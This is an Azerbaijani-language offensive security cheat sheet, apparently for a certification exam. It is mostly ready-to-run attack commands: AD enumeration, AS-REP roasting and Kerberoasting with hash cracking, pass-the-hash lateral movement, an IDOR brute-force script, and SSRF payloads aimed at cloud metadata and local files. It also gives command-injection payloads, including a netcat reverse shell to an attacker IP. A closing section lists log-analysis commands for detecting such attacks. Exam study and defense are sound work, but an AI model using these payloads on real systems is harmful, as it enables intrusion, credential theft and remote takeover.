
## I. Active Directory
### 1. Kəşfiyyat və Skan (Nmap & CrackMapExec)
```bash
# Hədəf IP-də bütün AD portlarını və SMB versiyasını yoxla
nmap -sV -sC -p88,135,389,445 <HƏDƏF_IP>

# Anonim SMB paylaşımlarını (Null Session) yoxla
crackmapexec smb <HƏDƏF_IP> --shares

# Anonim istifadəçi siyahısını çəkməyə çalış
crackmapexec smb <HƏDƏF_IP> --users

```
### 2. Kerberos Hücumları (Impacket)
```bash
# AS-REP Roasting: Şifrə tələb etməyən istifadəçilərin hash-ini çək
impacket-GetNPUsers <domain.local>/ -no-pass -usersfile users.txt -dc-ip <HƏDƏF_IP>

# Kerberoasting: SPN biletlərini çək (TGS Hash)
impacket-GetUserSPNs <domain.local>/<istifadəçi>:<şifrə> -dc-ip <HƏDƏF_IP> -request

# Hash qırmaq üçün (Hashcat)
hashcat -m 18200 asrep_hash.txt rockyou.txt
hashcat -m 13100 kerberoast_hash.txt rockyou.txt

```
### 3. Lateral Movement (PsExec / WmiExec)
```bash
# Əgər əlinizdə Administrator şifrəsi və ya NTLM Hash-i varsa:
impacket-psexec <domain.local>/administrator@<HƏDƏF_IP>

# Pass-the-Hash ilə giriş (Şifrə yerinə LM:NTLM hash istifadə edilir)
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:admin_ntlm_hash_bura <domain.local>/administrator@<HƏDƏF_IP>

```
## II. Web Application Attacks
### 1. IDOR (Burp / Python Automation)
Əgər çox sayda ID-ni sürətlə yoxlamaq lazımdırsa, bu sadə Python skriptindən istifadə edə bilərsiniz:
```python
import requests

url = "http://target.com/profile?user_id="

for user_id in range(1000, 1050):
    # İmtahandakı session cookie-ni bura yazın
    cookies = {'session': 'bura_cookie_yazin'} 
    r = requests.get(f"{url}{user_id}", cookies=cookies)
    
    # Əgər cavabda "Error" və ya "Unauthorized" yoxdursa, ID tapılıb
    if "Unauthorized" not in r.text:
        print(f"[+] Tapıldı! İstifadəçi ID: {user_id} - Ölçü: {len(r.text)}")

```
### 2. SSRF (Payloads)
Veb tətbiqdəki URL daxiletmə yerlərinə bu daxili keçidləri yazaraq sistem məlumatlarını oxumağa çalışın:
```text
# Yerli portu yoxlamaq (Məsələn daxili idarəetmə paneli)
http://127.0.0.1:80
http://localhost:8080

# AWS Metadata çəkmək (Əgər sistem AWS-dədirsə)
http://169.254.169.254/latest/meta-data/

# Fayl oxumaq (Fayl SSRF / LFI kombinasiyası)
file:///etc/passwd
file://C:/Windows/win.ini

```
### 3. Command Injection & Reverse Shell
Giriş sahəsinə (məsələn, ping formuna) yazılacaq payloadlar:
```bash
# Linux üçün əmr icrası yoxlanışı
127.0.0.1; id
127.0.0.1 && cat /etc/passwd

# Windows üçün
127.0.0.1 & whoami /priv

# Reverse Shell (Öncə öz maşınınızda 'nc -lvnp 4444' başladın)
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <SİZİN_IP> 4444 >/tmp/f

```
## III. Log Analysis (Linux CLI Commands)
İmtahanda sizə verilən .log və ya .csv fayllarını sürətlə analiz etmək üçün bu grep və awk birləşmələrindən istifadə edin.
### 1. Web Server Loqlarının Analizi (Apache/Nginx access.log)
```bash
# Ən çox sorğu göndərən top 10 IP ünvanını tap
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -n 10

# Uğurlu SQL Injection (UNION SELECT) cəhdlərini süzgəclə (Status 200 olanlar)
grep -i "UNION" access.log | grep " 200 "

# Command Injection cəhdlərini (whoami, id, cat) tap
grep -E "(whoami|id|cat%20|/bin/bash)" access.log

```
### 2. Şübhəli Fayl və Status Kodları
```bash
# 404 (Tapılmadı) xətası alan sorğuları say (Dizayn skanını - Directory Busting tapmaq üçün)
grep " 404 " access.log | awk '{print $7}' | sort | uniq -c | sort -nr | head -n 20

# Hücumçunun yüklədiyi şübhəli .php və ya .exe fayllarını axtar
grep -E "\.(php|exe|sh|py)" access.log

```
### 3. Windows Event Log (Evtx) JSON Analizi (jq ilə)
Əgər .evtx loqlarını JSON formatına çevirmisinizsə və ya hazır verilibsə:
```bash
# Uğursuz girişləri (Event ID 4625 - Bruteforce) tap və istifadəçi adlarını çıxar
cat security_logs.json | jq '.[] | select(.EventID==4625) | .TargetUserName' | sort | uniq -c

# PsExec kimi alətlərin yaratdığı yeni xidmətləri (Event ID 7045) axtar
cat system_logs.json | jq '.[] | select(.EventID==7045) | .ServiceName'

```
